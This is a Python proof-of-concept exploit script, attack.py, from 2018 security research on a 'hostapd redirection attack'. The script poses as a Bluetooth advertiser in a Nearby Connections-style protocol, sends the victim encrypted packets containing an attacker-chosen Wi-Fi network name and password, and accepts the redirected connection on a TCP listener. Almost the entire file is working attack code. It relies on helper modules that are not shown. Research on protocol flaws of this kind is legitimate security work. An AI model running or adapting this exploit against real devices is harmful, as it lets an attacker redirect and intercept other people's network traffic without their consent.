#!/usr/bin/python3

# attack.py - PoC of the hostapd redirection attack
# Copyright © 2018   D a n i e l e   A n t o n i o l i
# Permission is hereby granted, free of charge, to any person obtaining
# a copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included
# in all copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
# OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
# IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
# DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
# TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
# OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

import socket
import sys

from pub_api import Discoverer, Advertiser
from os import urandom

from constants import AES_IV_BYTES, NC_EKA_LEN, NC_PAY_LEN, NC_EWL_LEN
from constants import NC_EHA_LEN, NC_KA_LEN, NC_WL_LEN, NC_HA_LEN
from constants import NC_EWD_LEN, NC_WD_LEN, NC_SH_LEN

from lib import nc_scapy_pkt, nc_mac, nc_encrypt, nc_decrypt

from nc import Eka, WL, HA, KA, WL, SH

from scapy.all import raw
from bluetooth.btcommon import BluetoothError
from multiprocessing import Process, Queue, Pipe, Condition, current_process
from time import sleep


def t_adv_tcp(c_bt2wifi, c_wifi2dsc, q_adv):

    """
    Process to manage the hostapd bt2wifi switch.

    Recv 22 Bytes payload

    """
    tcp_sock = None

    try:
        recv_count = 0
        p = current_process()
        print('Start {}, {}'.format(p.name, p.pid))


        # start tcp socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_address = ("192.168.12.1", 59572)
        print('TCP Adv listens on %s port %s' % server_address)
        sock.bind(server_address)
        sock.listen(2)

        tcp_sock, client_address = sock.accept()
        print('TCP Adv connected to: {}'.format(client_address))

        # IW, not counted, 22 Bytes
        data = tcp_sock.recv(100)
        print('TCP Adv received IW: {}'.format(data))
        assert len(data) == 22

        with c_bt2wifi:
            print('TCP Adv waiting for BT SH protocol.')
            c_bt2wifi.wait()
            adv = q_adv.get()
            print('TCP Adv got from BT: {}'.format(adv))

            while True:
                data = tcp_sock.recv(100)
                adv.d2a_count += 1
                eka = Eka(data)
                mac = eka.mac
                ct = eka.ct
                iv = eka.iv
                mac_c = nc_mac(adv.dsc2adv_key, ct, iv, 'eka')[2]
                assert mac_c == mac
                pt = nc_decrypt(adv.dsc2adv_key, ct, iv)[2]
                print("TCP Adv rcvd ka pt_hex: {} {}, d2a_count: {}".format(pt.hex(),
                    len(pt.hex()), adv.d2a_count))

                adv.a2d_count += 1
                iv = urandom(AES_IV_BYTES)
                eka = nc_scapy_pkt('eka', [adv.adv2dsc_key, iv, adv.a2d_count])
                tcp_sock.sendall(raw(eka))
                print("TCP Adv sent eka, a2d_count: {}".format(adv.a2d_count))

    except Exception as e:
        raise e
    finally:
        with c_wifi2dsc:
            print('TCP Adv disconnects.')
            c_bt2wifi.notify_all()
        if tcp_sock is not None:
            tcp_sock.close()
            sock.close()
        print('Stop {}, {}'.format(p.name, p.pid))


def t_hostapd(c_bt2wifi, c_wifi2dsc, q_adv):

    adv = Advertiser("P2P_STAR", "sid", "name", "4udA", "hostapd")
    adv.advertise()
    adv.connect(auto_accept=True)

    try:

        # BT -> WLAN
        for i in range(2):
            adv.a2d_count += 1
            iv = urandom(AES_IV_BYTES)
            eka = nc_scapy_pkt('eka', [adv.adv2dsc_key, iv, adv.a2d_count])
            adv.rdsc.sock.send(raw(eka))
            print("Adv sent eka, a2d_count: {}".format(adv.a2d_count))
            data = adv.rdsc.sock.recv(1024)
            adv.d2a_count += 1
            eka = Eka(data)
            mac = eka.mac
            ct = eka.ct
            iv = eka.iv
            mac_c = nc_mac(adv.dsc2adv_key, ct, iv, 'eka')[2]
            assert mac_c == mac
            pt = nc_decrypt(adv.dsc2adv_key, ct, iv)[2]
            print("Adv rcvd ka pt_hex: {} {}, d2a_count: {}".format(pt.hex(),
                len(pt.hex()), adv.d2a_count))

        # EHA
        adv.a2d_count += 1
        adv.essid = b"B6RX1qnuNtFwxi4d5_U6F41ASmME"
        adv.password = b"AzrQq1KyjRnW"
        adv.tcp_port = b"\xb4\xd1\x03"
        iv = urandom(AES_IV_BYTES)
        eha = nc_scapy_pkt('eha', [adv.adv2dsc_key, iv, adv.a2d_count, adv.essid,
            adv.password, adv.tcp_port])
        adv.rdsc.sock.send(raw(eha))
        print("Adv sent eha {} {} {}, a2d_count: {}".format(
        adv.essid, adv.password, adv.tcp_port, adv.a2d_count))


        # BT -> WLAN
        disconnect_bt = False
        while disconnect_bt == False:
            data = adv.rdsc.sock.recv(1024)
            adv.d2a_count += 1
            eka = Eka(data)
            mac = eka.mac
            ct = eka.ct
            iv = eka.iv
            mac_c = nc_mac(adv.dsc2adv_key, ct, iv, 'eka')[2]
            assert mac_c == mac
            pt = nc_decrypt(adv.dsc2adv_key, ct, iv)[2]
            adv.a2d_count += 1
            iv = urandom(AES_IV_BYTES)
            if len(pt) == NC_KA_LEN:
                print("Adv rcvd ka: {} {}, d2a_count: {}".format(pt.hex(),
                    len(pt.hex()), adv.d2a_count))
                eka = nc_scapy_pkt('eka', [adv.adv2dsc_key, iv, adv.a2d_count])
                adv.rdsc.sock.send(raw(eka))
                print("Adv sent eka, a2d_count: {}".format(adv.a2d_count))
            elif len(pt) == NC_SH_LEN:
                    if pt[-3] == 2:
                        print("Adv rcvd sh: {} {}, d2a_count: {}".format(pt.hex(),
                            len(pt.hex()), adv.d2a_count))
                        esh = nc_scapy_pkt('esh', [adv.adv2dsc_key, iv, adv.a2d_count])
                        adv.rdsc.sock.send(raw(esh))
                        print("Adv sent esh, a2d_count: {}".format(adv.a2d_count))
                    elif pt[-3] == 3:
                        print("Adv rcvd sh2: {} {}, d2a_count: {}".format(pt.hex(),
                            len(pt.hex()), adv.d2a_count))
                        esh2 = nc_scapy_pkt('esh2', [adv.adv2dsc_key, iv, adv.a2d_count])
                        print("Adv sent esh2, a2d_count: {}".format(adv.a2d_count))
                        adv.rdsc.sock.send(raw(esh2))
                        disconnect_bt = True
    except KeyboardInterrupt or IOError or BluetoothError as e:
        print(e.message)
    except Exception as e:
        raise e
    finally:
        print("Adv closing client socket.")
        adv.disconnect()

    adv2 = adv
    adv2.server_sock = ''
    adv2.rdsc.sock = ''
    q_adv.put(adv2)
    print('Adv q_adv put: {}'.format(adv2))
    with c_bt2wifi:
        c_bt2wifi.notify_all()
        print('Adv notified c_bt2wifi')

    with c_wifi2dsc:
        print('Adv waits until TCP Adv is done.')
        c_wifi2dsc.wait()


def test_hostapd(prompt=True):

    q_adv = Queue()
    c_bt2wifi = Condition()
    c_wifi2dsc = Condition()
    p_adv_tcp = Process(name='p_adv_tcp', target=t_adv_tcp, args=(c_bt2wifi,
        c_wifi2dsc, q_adv))
    p_hostapd = Process(name='p_hostapd', target=t_hostapd, args=(c_bt2wifi,
        c_wifi2dsc, q_adv))

    p_adv_tcp.start()
    p_hostapd.start()

    p_hostapd.join()
    p_adv_tcp.join()



if __name__ == "__main__":

    test_hostapd(prompt=False)
